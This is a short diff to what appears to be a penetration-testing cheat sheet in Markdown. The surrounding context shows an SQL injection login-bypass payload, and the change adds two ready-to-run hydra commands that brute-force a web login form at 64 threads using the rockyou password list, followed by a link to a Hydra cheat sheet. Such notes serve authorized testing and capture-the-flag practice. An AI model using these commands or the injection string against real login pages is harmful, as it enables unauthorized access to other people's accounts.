@@ -195,4 +195,8 @@ admin") or "1"="1"/*
 ```
 
 ### Bruteforcing login forms
+```
+hydra -l admin -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
+hydra -l none -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
+```
 https://github.com/frizb/Hydra-Cheatsheet  
